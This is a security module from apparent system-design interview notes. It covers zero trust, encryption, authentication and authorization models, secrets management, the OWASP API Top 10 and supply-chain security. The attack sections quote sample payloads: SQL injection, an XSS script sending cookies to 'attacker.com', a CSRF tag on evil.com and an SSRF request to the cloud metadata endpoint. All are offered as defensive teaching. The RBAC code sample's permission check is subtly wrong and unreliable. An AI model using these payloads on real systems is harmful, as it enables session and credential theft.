# 🔐 Security

> **Series:** System Design Notes  
> **Module:** 12 — Security  
> **Prerequisites:** `08_api_design.md`, `10_observability.md`, `11_system_design_patterns.md`

---

## 📌 Table of Contents

1. [Security Mindset — Defence in Depth](#1-security-mindset--defence-in-depth)
2. [Zero Trust Architecture](#2-zero-trust-architecture)
3. [Encryption — In Transit & At Rest](#3-encryption--in-transit--at-rest)
4. [Authentication Patterns (Deep)](#4-authentication-patterns-deep)
5. [Authorization — RBAC vs ABAC vs ReBAC](#5-authorization--rbac-vs-abac-vs-rebac)
6. [Secrets Management](#6-secrets-management)
7. [mTLS & Service Identity](#7-mtls--service-identity)
8. [OWASP API Security Top 10 (2023)](#8-owasp-api-security-top-10-2023)
9. [Common Attack Vectors & Mitigations](#9-common-attack-vectors--mitigations)
10. [Security Headers](#10-security-headers)
11. [Supply Chain Security](#11-supply-chain-security)
12. [Security in CI/CD](#12-security-in-cicd)
13. [Compliance Frameworks](#13-compliance-frameworks)
14. [Real-World Architectures](#14-real-world-architectures)
15. [Common Mistakes](#15-common-mistakes)
16. [Interview Cheatsheet](#16-interview-cheatsheet)

---

## 1. Security Mindset — Defence in Depth

> **Definition:** Defence in Depth is the practice of layering multiple independent security controls so that if one control fails, others are still in place. No single layer is trusted completely.

```
The attacker's perspective: every system has vulnerabilities.
Your goal is not to be invulnerable — it is to make the cost of
attacking you higher than the value gained.

PERIMETER MODEL (old, broken):
  "Trust everything inside the network, block everything outside."
  Firewall → [internal network = trusted zone]
  
  Problem: Once attacker gets inside (phishing, insider, supply chain)
           → free movement. Nothing stops lateral movement.
  
DEFENCE IN DEPTH (modern):
  Layer 1: Network perimeter (WAF, DDoS protection)
  Layer 2: TLS everywhere (no plaintext)
  Layer 3: Authentication on every request
  Layer 4: Authorisation on every resource
  Layer 5: Input validation (prevent injection)
  Layer 6: Secrets management (no hardcoded creds)
  Layer 7: Observability (detect breaches fast)
  Layer 8: Incident response (contain + recover)
  
  If Layer 1 fails → Layer 2 catches it.
  If Layer 2 fails → Layer 3 catches it. And so on.
```

### The Principle of Least Privilege

> Every user, service, and process should have only the minimum permissions required to do its job — nothing more.

```
BAD:
  Service A connects to DB with root credentials.
  Service A gets compromised → attacker has full DB access.

GOOD:
  Service A connects with user "svc_a" with only:
    SELECT on orders table
    INSERT on orders table
    No DROP, no other tables, no other schemas.
  Service A compromised → attacker can only read/write orders. Contained. ✅
```

---

## 2. Zero Trust Architecture

> **"Never trust, always verify."** — NIST SP 800-207

> Zero Trust assumes the network is already compromised. Every request — regardless of whether it comes from inside or outside the corporate network — must be authenticated, authorized, and encrypted.

```
TRADITIONAL (Perimeter/Castle-Moat):
  External → Firewall → [Internal Network — TRUSTED]
  Once inside → access to everything
  
ZERO TRUST:
  Every request → Authenticate WHO is asking
               → Authorise WHAT they can access
               → Encrypt ALL communication
               → Log EVERYTHING for audit
               
  No implicit trust. Even internal service A calling service B
  must prove its identity before B responds.
```

### Zero Trust Pillars

```
┌─────────────────────────────────────────────────────────────────────┐
│                    ZERO TRUST PILLARS                               │
│                                                                     │
│  IDENTITY     → Verify every user and service identity              │
│                 (JWT, mTLS certificates, SPIFFE/SVID)               │
│                                                                     │
│  DEVICE       → Verify device posture (MDM, endpoint health)        │
│                                                                     │
│  NETWORK      → Micro-segment — service A cannot reach service C    │
│                 unless explicitly permitted by policy                │
│                                                                     │
│  APPLICATION  → Validate at the app layer, not just the network     │
│                 (service mesh policies, OPA policy engine)           │
│                                                                     │
│  DATA         → Classify + encrypt data; minimal exposure           │
│                 (field-level encryption, tokenisation)               │
└─────────────────────────────────────────────────────────────────────┘
```

### Zero Trust in Practice (Microservices)

```
User → API Gateway (validates JWT) → Service A
                                         │ 
                                         │ calls Service B
                                         │ presents mTLS certificate
                                         ▼
                                     Service B
                                     validates:
                                       ✅ mTLS cert is valid
                                       ✅ cert belongs to Service A
                                       ✅ Service A is authorised for this endpoint
                                       ✅ JWT claim matches allowed scope
                                     
Service B gets compromised → cannot call Service C
  (no cert for Service C, network policy blocks it) → blast radius contained
```

---

## 3. Encryption — In Transit & At Rest

### Encryption in Transit

> All traffic must be encrypted. No exceptions.

```
TLS 1.3 (current standard):
  - 1-RTT handshake (vs 2-RTT for TLS 1.2) → faster
  - Forward secrecy by default (ephemeral Diffie-Hellman keys)
  - Removes weak ciphers (RC4, MD5, SHA-1) entirely
  - MUST use: AES-GCM, ChaCha20-Poly1305

External traffic:   Client ──HTTPS (TLS 1.3)──► API Gateway / CDN
Internal traffic:   Service A ──mTLS──► Service B  (both sides authenticate)
Database traffic:   App ──TLS──► DB  (even within VPC)
Message queues:     Producer ──TLS──► Kafka/SQS

HSTS (HTTP Strict Transport Security):
  Tells browsers: never connect over HTTP again
  Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

### Encryption at Rest

> Data stored anywhere must be encrypted.

```
Database encryption:
  Transparent Data Encryption (TDE): DB encrypts files on disk.
  App-level encryption: encrypt before writing to DB (stronger — DB breach doesn't expose data).

Key hierarchy (AWS KMS pattern):
  Master Key (CMK)    → lives in KMS, never leaves
      ↓ encrypts
  Data Encryption Key (DEK)  → encrypts the actual data
  
  If DEK is compromised → rotate DEK, re-encrypt data with new DEK
  CMK never needs to change.

Field-level encryption (most sensitive data):
  Credit card → encrypt individual field before storing
  SELECT card_number FROM payments
    → returns encrypted blob unless caller has decryption key
    → even DB admin cannot read card numbers ✅
```

### TLS Certificate Management

```
Manual cert management (avoid):
  Generate CSR → send to CA → get cert → install → remember to renew → repeat every year
  Humans forget → certs expire → outage

Automated cert management:
  Let's Encrypt + Certbot / cert-manager (Kubernetes):
    Auto-renews 30 days before expiry
    Zero manual intervention
    Free certificates

  Internal PKI (for mTLS):
    HashiCorp Vault PKI → issues short-lived certs (24h TTL)
    SPIFFE/SPIRE → issues SVID identities for workloads
    Cert rotation is automatic → compromise window is tiny
```

---

## 4. Authentication Patterns (Deep)

> Authentication = proving identity. Covered at a high level in `08_api_design.md`. This section goes deeper on security-specific considerations.

### Session vs Token (Stateful vs Stateless)

```
SESSION (stateful):
  Client logs in → Server creates session → stores in Redis → returns session_id cookie
  
  Cookie: session_id=abc123; HttpOnly; Secure; SameSite=Strict
  
  Next request: client sends cookie → server looks up Redis → validates
  
  ✅ Instant revocation (delete session from Redis)
  ❌ Server must maintain session store → state
  ❌ Doesn't scale to multiple DCs without shared Redis

JWT (stateless):
  Client logs in → Server creates signed JWT → returns token
  
  Next request: client sends JWT in header → server validates signature (no DB lookup)
  
  ✅ Stateless → scales horizontally
  ❌ Cannot revoke before expiry (mitigate: short TTL + refresh token rotation)
  ❌ Token grows large with many claims
```

### JWT Security Hardening

```
Algorithm:
  ✅ Use: RS256 (RSA), ES256 (ECDSA) — asymmetric
  ❌ Avoid: HS256 (HMAC) — symmetric secret must be shared between all validators
  ❌ NEVER: alg: "none" — classic JWT attack — always validate alg header

Validation checklist (every validator must do ALL of these):
  1. Verify signature using public key
  2. Check alg header matches expected algorithm
  3. Check exp claim — reject if expired
  4. Check iss claim — reject if wrong issuer
  5. Check aud claim — reject if wrong audience (prevents token reuse across services)
  6. Check nbf claim — reject if not yet valid

Token storage:
  Web app: httpOnly cookie (not localStorage — XSS can't steal it)
  Mobile app: OS secure storage (Keychain on iOS, Keystore on Android)
  ❌ Never: localStorage or sessionStorage (XSS readable)

Short-lived access tokens + refresh token rotation:
  Access token:  15 minutes TTL
  Refresh token: 7 days TTL, httpOnly cookie
  On refresh:    issue new refresh token, invalidate old one (rotation)
  If refresh token leaked: can detect reuse → invalidate entire session ✅
```

### Multi-Factor Authentication (MFA)

```
Factors:
  Something you KNOW:  password, PIN
  Something you HAVE:  TOTP app (Authenticator), hardware key (YubiKey)
  Something you ARE:   biometric (fingerprint, face)

MFA types (ranked by strength):
  1. Hardware security key (FIDO2/WebAuthn) — phishing-proof ✅✅✅
  2. TOTP (Google Authenticator, Authy)     — phishing-resistant ✅✅
  3. Push notification (Duo)               — phishing-possible ✅
  4. SMS OTP                               — SIM-swap vulnerable ⚠️
  5. Email OTP                             — weakest factor ⚠️

For privileged access (admin, production):
  REQUIRE hardware key or TOTP minimum.
  SMS MFA is insufficient for high-value targets.
```

---

## 5. Authorization — RBAC vs ABAC vs ReBAC

### RBAC — Role-Based Access Control

> Assign permissions to **roles**. Assign roles to users. Simple, audit-friendly.

```
Roles:          admin, editor, viewer, billing_manager
Permissions:    read:orders, write:orders, delete:orders, read:billing

User "Satyam" → role: editor
editor →        permissions: read:orders, write:orders

Request: DELETE /orders/42
  User has role: editor
  editor does NOT have: delete:orders
  → 403 Forbidden ✅
```

```python
# Simple RBAC check
ROLE_PERMISSIONS = {
    "admin":   ["read:*", "write:*", "delete:*"],
    "editor":  ["read:orders", "write:orders"],
    "viewer":  ["read:orders"],
}

def authorize(user_role: str, required_permission: str) -> bool:
    permissions = ROLE_PERMISSIONS.get(user_role, [])
    return required_permission in permissions or "write:*" in permissions
```

| ✅ Pros | ❌ Cons |
|---|---|
| Simple to understand and audit | Coarse-grained — can't express "user can only edit their own orders" |
| Easy to implement | Role explosion at scale (hundreds of roles for edge cases) |
| Well-supported in frameworks | Static — not context-aware |

**Best for:** Simple apps, admin panels, internal tools

---

### ABAC — Attribute-Based Access Control

> Permissions based on **attributes** of subject, resource, and environment. Highly flexible.

```
Policy: "A user can EDIT an order IF:
          user.role = 'editor'
          AND order.status != 'completed'
          AND order.owner_id = user.id
          AND request.time BETWEEN 09:00 AND 18:00"

Can express:
  - Row-level security (user can only edit their own records)
  - Time-based access (only during business hours)
  - Data classification (only access records below your clearance level)
  - Environment context (block access from unusual geos)
```

| ✅ Pros | ❌ Cons |
|---|---|
| Extremely fine-grained | Complex to implement and audit |
| Context-aware (time, location, device) | Policy management overhead |
| No role explosion | Harder to debug "why was I denied?" |

**Best for:** Regulated industries (healthcare, finance), multi-tenant SaaS, data-classified systems

---

### ReBAC — Relationship-Based Access Control

> Permissions derived from **relationships** between entities in a graph. Used by Google Zanzibar (the system powering Google Docs sharing).

```
"Can Alice VIEW document-42?"
  → Check: Is Alice in the EDITOR group for document-42?
  → Check: Is Alice in the VIEWER group?
  → Check: Does Alice own the parent folder?
  → Walk the relationship graph until answer found.

Google Docs sharing:
  document:42#viewer → user:alice
  document:42#editor → group:eng-team
  group:eng-team#member → user:bob
  
  "Can Bob view document:42?"
  → Bob is member of eng-team → eng-team is editor of doc:42
  → Editors can view → ✅
```

**Used by:** Google Drive/Docs (Zanzibar), GitHub (repo permissions), Airbnb, Slack (enterprise grid)
**Open-source implementations:** OpenFGA (Auth0), Warrant, SpiceDB (Authzed)

---

### Authorization Decision Matrix

| Scenario | Best Model |
|---|---|
| Simple admin/user/viewer roles | RBAC |
| Users can only edit their own data | ABAC (owner attribute) |
| Document/folder sharing like Google Docs | ReBAC |
| Regulated data with clearance levels | ABAC |
| Multi-tenant SaaS (org → team → user hierarchy) | ReBAC or ABAC |
| Microservice-level access control | OPA (Open Policy Agent) — policy-as-code |

### OPA — Open Policy Agent

> Centralised policy engine. Policies defined in Rego language. Services query OPA for decisions — no per-service authorization code.

```
Rego policy:
  package api.authz

  allow {
    input.method = "GET"
    input.user.roles[_] = "viewer"
  }

  allow {
    input.method = "POST"
    input.user.roles[_] = "editor"
    input.resource.owner_id = input.user.id  # can only POST their own
  }

Service calls OPA:
  POST /v1/data/api/authz/allow
  { "input": { "method": "POST", "user": {...}, "resource": {...} } }
  → { "result": true }
```

---

## 6. Secrets Management

> **Definition:** Secrets are credentials, API keys, database passwords, certificates, and any other sensitive configuration that grants access to systems. Secrets must never be hardcoded or stored in version control.

### The Problem: Secret Sprawl

```
BAD (common in early projects):
  # .env file checked into Git 😱
  DB_PASSWORD=super_secret_123
  STRIPE_KEY=sk_live_abc...
  AWS_SECRET=AKIAI...

  Consequences:
  - Anyone with repo access (including all-time git history) can see secrets
  - Rotating requires code change + deploy
  - No audit trail of who used which secret when
```

### Secret Management Solutions

```
┌──────────────────────────────────────────────────────────────────────┐
│                    SECRET MANAGEMENT OPTIONS                         │
│                                                                      │
│  HashiCorp Vault (self-hosted):                                      │
│    Dynamic secrets: generates short-lived DB credentials on demand   │
│    Secret lease + auto-rotation                                       │
│    Fine-grained access policies                                       │
│    Audit log of every secret access                                   │
│                                                                      │
│  AWS Secrets Manager (managed):                                      │
│    Integrated with IAM — only IAM role can access secret             │
│    Automatic rotation for RDS credentials                            │
│    Replicated across regions                                         │
│                                                                      │
│  AWS SSM Parameter Store (lighter):                                  │
│    Free for standard tier                                             │
│    KMS-encrypted SecureString parameters                             │
│    Good for config + non-critical secrets                            │
│                                                                      │
│  Kubernetes Secrets (+ external secret operator):                    │
│    Base64 encoded (NOT encrypted by default!)                        │
│    Use External Secrets Operator to sync from Vault/ASM into K8s    │
└──────────────────────────────────────────────────────────────────────┘
```

### Dynamic Secrets (HashiCorp Vault)

> Instead of a static long-lived DB password, Vault generates a unique, time-limited credential for each service instance.

```
Static secret (bad):
  Service A uses: DB_PASSWORD=shared_password (rotated every 90 days manually)
  Service B uses: DB_PASSWORD=shared_password (same cred — any breach = all access)

Dynamic secret (Vault):
  Service A starts → requests DB credentials from Vault
  Vault: generates unique creds → db_user_xyz / password_abc → TTL: 1 hour
  Service A uses those creds → they expire in 1 hour
  
  Next Service A instance → gets different creds
  If creds compromised → attacker has 1 hour max + no other service affected ✅
```

### Secret Injection (Kubernetes pattern)

```yaml
# External Secrets Operator — syncs from AWS Secrets Manager to K8s Secret
apiVersion: external-secrets.io/v1beta1
kind: ExternalSecret
metadata:
  name: db-credentials
spec:
  refreshInterval: 1h
  secretStoreRef:
    name: aws-secrets-manager
    kind: SecretStore
  target:
    name: db-secret          # K8s Secret name
  data:
    - secretKey: password    # K8s Secret key
      remoteRef:
        key: prod/db/payment-service   # AWS SM secret name
        property: password
```

```yaml
# Pod uses secret as env var — never hardcoded
env:
  - name: DB_PASSWORD
    valueFrom:
      secretKeyRef:
        name: db-secret
        key: password
```

### Secret Rotation

```
Rotation strategy:
  1. Vault generates new credential
  2. New credential synced to app (via External Secrets or direct Vault SDK)
  3. App restarts / hot-reloads credential
  4. Old credential revoked after grace period

AWS RDS + Secrets Manager:
  Enable auto-rotation → Lambda rotates every N days → zero manual work
  
Certificate rotation:
  cert-manager (K8s) → auto-renews before expiry
  Vault PKI + short TTL (24h) → certs constantly cycling
```

---

## 7. mTLS & Service Identity

> Already introduced in `11_system_design_patterns.md` (Sidecar + Service Mesh). Security-specific depth here.

### SPIFFE / SPIRE — Workload Identity

> **SPIFFE** (Secure Production Identity Framework For Everyone) defines a standard for cryptographic workload identities. Every service gets a cryptographically verifiable identity (SVID), regardless of platform.

```
SPIFFE ID format: spiffe://trust-domain/service/payment-service
SVID: X.509 certificate containing the SPIFFE ID in SAN field

Service A starts → SPIRE Agent issues SVID to Service A
Service A calls Service B via mTLS:
  TLS handshake: Service A presents its SVID
  Service B validates:
    ✅ SVID is valid (signed by trusted SPIFFE CA)
    ✅ SVID belongs to "payment-service" (expected caller)
    ✅ SVID hasn't expired (short TTL)
  → Connection allowed ✅

No hardcoded certificates. No manual distribution.
SPIRE rotates SVIDs automatically.
```

### mTLS in Practice

```
Standard TLS (one-way):
  Client → Server: "Are YOU who you claim to be?" (server cert only)
  Server authenticates itself. Client anonymous.

mTLS (mutual — zero trust):
  Client → Server: "Are YOU who you claim to be?" (server cert)
  Server → Client: "Are YOU who you claim to be?" (client cert)
  Both sides authenticate. No anonymous callers.

In Kubernetes with Istio:
  Enable PeerAuthentication → ALL service-to-service traffic uses mTLS
  No code changes in services — sidecar (Envoy) handles everything
```

```yaml
# Istio PeerAuthentication — enforce mTLS cluster-wide
apiVersion: security.istio.io/v1beta1
kind: PeerAuthentication
metadata:
  name: default
  namespace: istio-system   # cluster-wide
spec:
  mtls:
    mode: STRICT  # reject all non-mTLS traffic

# AuthorizationPolicy — Service A can only call specific endpoints on B
apiVersion: security.istio.io/v1beta1
kind: AuthorizationPolicy
metadata:
  name: payment-access
  namespace: prod
spec:
  selector:
    matchLabels:
      app: payment-service
  rules:
    - from:
        - source:
            principals: ["cluster.local/ns/prod/sa/order-service"]
      to:
        - operation:
            methods: ["POST"]
            paths: ["/charge"]
```

---

## 8. OWASP API Security Top 10 (2023)

> The definitive list of the most critical API security risks. Know all 10 for interviews.

| # | Risk | Brief | Fix |
|---|---|---|---|
| **API1** | Broken Object Level Authorization (BOLA) | User A accesses User B's objects by changing ID | Validate ownership on EVERY object access |
| **API2** | Broken Authentication | Weak auth mechanisms — guessable tokens, missing expiry | JWT with short TTL, MFA, lockout on failures |
| **API3** | Broken Object Property Level Auth | Returns or accepts fields user shouldn't access | Strict output filtering + input allowlisting |
| **API4** | Unrestricted Resource Consumption | No rate limits → DoS via expensive queries | Rate limiting, max page size, timeout on queries |
| **API5** | Broken Function Level Authorization | Regular user calls admin endpoint | Explicit role check on every endpoint |
| **API6** | Unrestricted Access to Sensitive Business Flows | Bot buys all stock at checkout, bypasses fraud | Business-level rate limits, bot detection, CAPTCHA |
| **API7** | Server-Side Request Forgery (SSRF) | API fetches user-supplied URL → scans internal network | Validate + allowlist URLs, block 169.254.x.x |
| **API8** | Security Misconfiguration | Debug endpoints on, default passwords, CORS `*` | Security hardening checklist, disable debug in prod |
| **API9** | Improper Inventory Management | Old API versions still live, unpatched | API inventory, sunset old versions, automated scanning |
| **API10** | Unsafe Consumption of APIs | Trusting 3rd party API response without validation → injection | Validate and sanitise all external API responses |

### BOLA (API1) — The Most Common

```
BOLA example:
  GET /api/orders/1234   ← User A's order (legitimate)
  GET /api/orders/1235   ← User B's order (attacker guesses sequential ID)
  GET /api/orders/1236   ← User C's order

BROKEN:
  if (order_exists(order_id)):
    return order   ← no ownership check!

FIXED:
  order = get_order(order_id)
  if order.user_id != current_user.id:
    return 403 Forbidden  ✅
  return order

Use UUIDs instead of sequential IDs to make guessing harder.
But UUIDs are NOT a substitute for authorisation checks.
```

### SSRF (API7) — Deep Dive

```
Attack:
  API has endpoint: POST /api/fetch-image { "url": "https://..." }
  Attacker sends: { "url": "http://169.254.169.254/latest/meta-data/" }
                                              ↑ AWS metadata endpoint
  API fetches it → returns IAM credentials to attacker → full AWS access 🔴

Mitigation:
  ✅ Allowlist: only fetch from allowed domains
  ✅ Block: 169.254.x.x, 10.x.x.x, 172.16.x.x, 127.x.x.x (RFC 1918 + link-local)
  ✅ Resolve DNS first → check resolved IP against blocklist
  ✅ Use egress proxy for all outbound requests from services
```

---

## 9. Common Attack Vectors & Mitigations

### SQL Injection

```
ATTACK:
  Input: email = "admin@example.com' OR '1'='1"
  Query: SELECT * FROM users WHERE email = 'admin@example.com' OR '1'='1'
  Result: returns ALL users 🔴

FIX — Parameterised queries (ALWAYS):
  # BAD — string concatenation
  query = f"SELECT * FROM users WHERE email = '{email}'"
  
  # GOOD — parameterised
  cursor.execute("SELECT * FROM users WHERE email = %s", (email,))
  
  # ORM (SQLAlchemy, Django ORM) handles this for you automatically
  User.query.filter_by(email=email).first()
```

### Cross-Site Scripting (XSS)

```
ATTACK:
  User submits: name = "<script>document.cookie.send('attacker.com')</script>"
  App renders:  <div>Hello, <script>...</script></div>
  Browser executes script → steals session cookie 🔴

FIXES:
  1. Output encoding: escape HTML entities before rendering
     < → &lt;   > → &gt;   " → &quot;   ' → &#x27;
  
  2. Content Security Policy header:
     Content-Security-Policy: default-src 'self'; script-src 'self'
     → browser refuses to execute inline scripts or scripts from other origins
  
  3. HttpOnly cookies: document.cookie is inaccessible to JS
     Set-Cookie: session=abc; HttpOnly; Secure
```

### Cross-Site Request Forgery (CSRF)

```
ATTACK:
  User is logged in to bank.com.
  User visits evil.com which contains:
    <img src="https://bank.com/transfer?to=attacker&amount=1000">
  Browser sends request to bank.com WITH the user's session cookie.
  Bank processes transfer as legitimate user! 🔴

FIXES:
  1. CSRF token: server generates random token, embeds in form,
     validates on every state-changing request.
     
  2. SameSite cookie attribute:
     Set-Cookie: session=abc; SameSite=Strict; HttpOnly; Secure
     → browser won't send cookie on cross-site requests ✅
  
  3. Check Origin/Referer header (secondary check)
  
  Note: If using JWT in Authorization header (not cookie),
        CSRF is not applicable — attackers can't set custom headers.
```

### Injection (General)

```
Rule: NEVER build queries/commands by concatenating user input.
Always use parameterised queries, prepared statements, or ORMs.

Applies to:
  SQL:     parameterised queries
  NoSQL:   MongoDB — sanitise operators ($where, $gt abuse)
  LDAP:    escape special characters
  OS commands: never shell out with user input; use library APIs instead
  XML/XPATH:   use schema validation, avoid dynamic XPath
```

---

## 10. Security Headers

> HTTP response headers that instruct browsers on security policies. Free security wins — add them to every response.

```http
# Prevent clickjacking (embedding in iframe)
X-Frame-Options: DENY

# Force HTTPS for 1 year, include subdomains, preload
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

# Prevent MIME type sniffing
X-Content-Type-Options: nosniff

# Control what data is sent in Referer header
Referrer-Policy: strict-origin-when-cross-origin

# Restrict powerful browser APIs by default
Permissions-Policy: geolocation=(), microphone=(), camera=()

# Content Security Policy — most powerful, most complex
Content-Security-Policy: 
  default-src 'self';
  script-src 'self' 'nonce-{random}';  # only scripts with nonce
  style-src 'self' https://fonts.googleapis.com;
  img-src 'self' data: https:;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';              # equivalent to X-Frame-Options: DENY
  upgrade-insecure-requests;           # upgrade HTTP to HTTPS

# CORS — only allow specific origins to make cross-origin requests
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Authorization, Content-Type
# NEVER in production:
# Access-Control-Allow-Origin: *  ← allows ANY site to call your API
```

---

## 11. Supply Chain Security

> Modern software relies on thousands of third-party packages. Attackers increasingly target the supply chain — compromise one widely-used package to attack all consumers.

### Famous Attacks

```
SolarWinds (2020):
  Attackers compromised SolarWinds build pipeline
  Injected malware into legitimate software update
  18,000+ organisations downloaded trojanised update
  
Log4Shell (2021):
  Critical RCE vulnerability in log4j (Java logging library)
  Used by millions of applications worldwide
  CVSS score: 10.0 (maximum)
  
XZ Utils (2024):
  Attacker spent 2 years as maintainer of XZ (compression library)
  Injected backdoor into release tarball
  Nearly compromised most Linux SSH servers globally
```

### Software Bill of Materials (SBOM)

```
SBOM = machine-readable list of all components in your software.
Like a nutrition label for software.

Tools: Syft, Grype, CycloneDX, SPDX

Generate SBOM:
  syft your-image:latest -o spdx-json > sbom.json

Scan for known vulnerabilities (CVEs):
  grype sbom:sbom.json

In CI/CD:
  Every build → generate SBOM → scan against CVE DB → fail build on critical CVEs
```

### Dependency Security

```
1. Pin dependency versions (lock files):
   package-lock.json, requirements.txt with exact versions, go.sum
   Prevents unexpected major updates mid-build

2. Scan dependencies:
   Dependabot (GitHub), Snyk, OWASP Dependency Check

3. Verify package integrity:
   npm: package-lock.json contains hashes
   Python: hash checking mode (pip install --require-hashes)
   Docker: pin images by digest sha256:abc123 (not just :latest tag)

4. Minimal base images:
   Use distroless or Alpine — fewer packages = smaller attack surface
   docker pull gcr.io/distroless/java   ← no shell, no package manager

5. Private package registry:
   All packages go through internal registry
   Scanned before being available internally
   Prevents dependency confusion attacks
```

---

## 12. Security in CI/CD

> Shift security left — catch issues before they reach production.

```
┌──────────────────────────────────────────────────────────────────────┐
│                     SECURE CI/CD PIPELINE                           │
│                                                                      │
│  Code Commit                                                         │
│    ↓                                                                 │
│  Pre-commit hooks: secret scanning (git-secrets, gitleaks)          │
│    ↓                                                                 │
│  CI Pipeline:                                                        │
│    SAST (Static Analysis):    Semgrep, SonarQube, Checkmarx         │
│      → Finds: SQL injection, hardcoded secrets, insecure patterns   │
│    Dependency scan:           Snyk, Dependabot, OWASP DC            │
│      → Finds: Known CVEs in your libraries                          │
│    Container scan:            Trivy, Grype, Clair                   │
│      → Finds: Vulnerabilities in base image packages                │
│    Secret scan:               Trufflehog, GitLeaks                  │
│      → Finds: API keys, passwords accidentally committed            │
│    ↓                                                                 │
│  Build + Sign Artifact:       Sigstore/cosign signs container image  │
│    ↓                                                                 │
│  DAST (Dynamic Analysis):     OWASP ZAP, Burp Suite (staging)       │
│      → Sends live attack payloads to staging environment            │
│      → Finds: XSS, SQLi, auth bypasses at runtime                  │
│    ↓                                                                 │
│  Deploy to Production:        Verify signature before deploy         │
│    ↓                                                                 │
│  Runtime protection:          Falco (anomaly detection in K8s pods)  │
└──────────────────────────────────────────────────────────────────────┘
```

### Infrastructure as Code (IaC) Security

```
Scan Terraform/CloudFormation before apply:
  Checkov, tfsec, Terrascan
  
Common IaC misconfigurations caught:
  ❌ S3 bucket with public access
  ❌ Security group allowing 0.0.0.0/0 on port 22 (SSH to world)
  ❌ RDS without encryption at rest
  ❌ No VPC flow logs enabled
  ❌ IAM policy with "*" actions on "*" resources
```

---

## 13. Compliance Frameworks

> Know which frameworks apply to which industries for interviews.

| Framework | Industry | Key Requirements |
|---|---|---|
| **SOC 2** | SaaS / Cloud | Security, availability, confidentiality controls. Annual audit. |
| **PCI-DSS** | Payment card data | Encrypt cardholder data, restrict access, quarterly scans, penetration testing |
| **HIPAA** | Healthcare (US) | PHI encryption, audit logs, BAA with vendors, breach notification |
| **GDPR** | EU user data | Data minimization, right to erasure, consent, DPA required, 72h breach notification |
| **ISO 27001** | General | Information security management system (ISMS). International standard. |
| **FedRAMP** | US Federal gov | Cloud services for government — highest security bar |

### Practical Implications

```
PCI-DSS (payment processing):
  Never store raw CVV (ever)
  Mask PAN in logs (show only last 4 digits)
  Network segmentation: cardholder data environment isolated
  Penetration test at least annually
  All access to cardholder data logged and monitored

GDPR (if you have EU users):
  Log request_id (not PII) → link to user data separately
  Implement "right to erasure" endpoint
  Data retention policies — delete after purpose served
  Privacy by design: collect minimum data needed
```

---

## 14. Real-World Architectures

### Netflix — Zero Trust Auth (Passport Pattern)

```
External request arrives at edge (API Gateway):
  → Validates JWT token from client
  → Decrypts + resolves user identity
  → Creates internal "Passport" struct:
    { user_id: 42, roles: ["subscriber"], tier: "premium" }
  → Signs Passport with HMAC (edge secret)
  → Attaches to request, forwards to internal services

Internal services (never see external JWT):
  → Validate Passport HMAC signature
  → Trust the identity claims inside Passport
  → Apply service-level authorisation

Benefits:
  ✅ Internal services never handle auth token parsing
  ✅ Single point for external auth (edge)
  ✅ Passport can't be forged — HMAC signed by trusted edge
  ✅ Internal service compromise doesn't expose auth logic
```

### Stripe — PCI-DSS Architecture

```
Card data flow:
  User browser ──(TLS)──► Stripe.js (client-side SDK)
                           Tokenises card IN BROWSER
                           → sends token (not card data) to Stripe
                           
  Merchant server NEVER sees raw card data
  Card data only touches Stripe's PCI-DSS certified environment

Cardholder Data Environment (CDE):
  Isolated network segment
  HSMs (Hardware Security Modules) store encryption keys
  All access logged, MFA enforced for all engineers
  Zero-access policy — engineers see only metadata, not card numbers

Merchant integration:
  Receives payment_method_id (token) only
  Charges by token → Stripe resolves to real card
  Token is useless to attackers — can't be used outside Stripe
```

---

## 15. Common Mistakes

| Mistake | Why It's Bad | Fix |
|---|---|---|
| **Secrets in Git** | Anyone with repo access → full DB / API access | Use Vault / AWS Secrets Manager; scan commits with git-secrets |
| **Long-lived tokens (no expiry)** | Leaked token = permanent compromise | JWT: 15m TTL + refresh rotation |
| **No BOLA check** | User A reads/edits User B's data by changing ID | Validate ownership on every object fetch |
| **`CORS: *`** | Any site can call your API — reads auth'd responses | Allowlist specific origins |
| **String-concatenated SQL** | SQLi → full DB dump | Parameterised queries always |
| **Hardcoded credentials in Docker image** | `docker history` reveals secrets | Use env vars from secret store |
| **Missing rate limiting** | Credential stuffing, brute force, resource exhaustion | Rate limit on auth endpoints especially |
| **Debug endpoints in production** | `/actuator`, `/.env`, `/phpinfo.php` expose internals | Disable debug endpoints in prod config |
| **No MFA on admin accounts** | Phished password = full admin access | Enforce TOTP or hardware key for privileged users |
| **Trusting user-supplied URLs** | SSRF → internal metadata access | Allowlist + blocklist for outbound URLs |
| **Logging sensitive data** | PII / secrets in logs → breach via log access | Sanitise log fields; never log passwords/tokens/cards |

---

## 16. Interview Cheatsheet

### Quick Definitions

| Term | One-liner |
|---|---|
| **Defence in Depth** | Layer multiple independent security controls |
| **Zero Trust** | Never trust, always verify — authenticate every request |
| **mTLS** | Both sides present certificates — no anonymous callers |
| **RBAC** | Permissions via roles assigned to users |
| **ABAC** | Permissions via attributes of subject + resource + environment |
| **BOLA** | Accessing another user's objects by changing ID (OWASP #1) |
| **SSRF** | Server fetches attacker-controlled URL → internal network access |
| **CSRF** | Attacker tricks browser into making auth'd request on user's behalf |
| **XSS** | Injecting scripts into pages viewed by other users |
| **SBOM** | Software Bill of Materials — inventory of all dependencies |
| **SAST** | Static code analysis — finds issues without running code |
| **DAST** | Dynamic analysis — sends attack payloads to running app |
| **SPIFFE/SVID** | Cryptographic workload identity standard for microservices |
| **Least Privilege** | Grant only the minimum permissions needed |
| **Secrets Rotation** | Periodically replace credentials to limit breach window |

### When to Mention What in Interviews

| Scenario | Security Patterns |
|---|---|
| "How would you secure a payment system?" | PCI-DSS, TLS, mTLS, field-level encryption, tokenisation, BOLA checks |
| "How do microservices authenticate each other?" | mTLS + SPIFFE, Service Mesh (Istio), OPA for authz |
| "How would you prevent data breaches?" | Encryption at rest, least privilege, secrets manager, audit logs |
| "Design auth for a multi-tenant SaaS" | JWT (short TTL) + refresh, RBAC or ReBAC, row-level security |
| "How do you protect your API?" | Rate limiting, BOLA checks, input validation, WAF, OWASP Top 10 |
| "How do you handle secrets?" | Vault dynamic secrets, External Secrets Operator, never in Git |
| "What is Zero Trust?" | Never trust, always verify — mTLS + JWT + micro-segmentation |
| "How do you shift security left?" | SAST + dependency scan + secret scan in CI/CD |

### Must-Know Interview Points

- ☑ **Defence in depth** — never rely on one control; layer them.
